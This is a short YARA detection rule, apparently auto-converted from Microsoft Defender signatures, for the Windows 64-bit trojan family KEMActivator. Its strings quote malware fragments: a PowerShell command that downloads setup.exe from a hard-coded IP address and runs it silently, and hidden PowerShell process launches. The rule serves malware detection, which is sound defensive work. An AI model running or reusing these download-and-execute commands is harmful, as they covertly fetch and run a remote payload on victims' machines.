rule Trojan_Win64_KEMActivator_PGKA_2147965265_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/KEMActivator.PGKA!MTB"
        threat_id = "2147965265"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "KEMActivator"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "try{$wc.DownloadFile('http://194.87.138.68/setup.exe','C:\\test\\setup.exe')}catch{}\" & ping -n 1 127.0.0.1 >nul " ascii //weight: 5
        $x_5_2 = "if exist \"C:\\test\\setup.exe\" start \"\" \"C:\\test\\setup.exe\" /did=757674 /S & powershell -WindowStyle Hidden -Command" ascii //weight: 5
        $x_5_3 = "if exist \"%%~G\" start \"\" \"%%~G\" >nul 2>&1 & if exist \"down.exe\" powershell -nop -w hidden -c \"Start-Process -WindowStyle Hidden" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

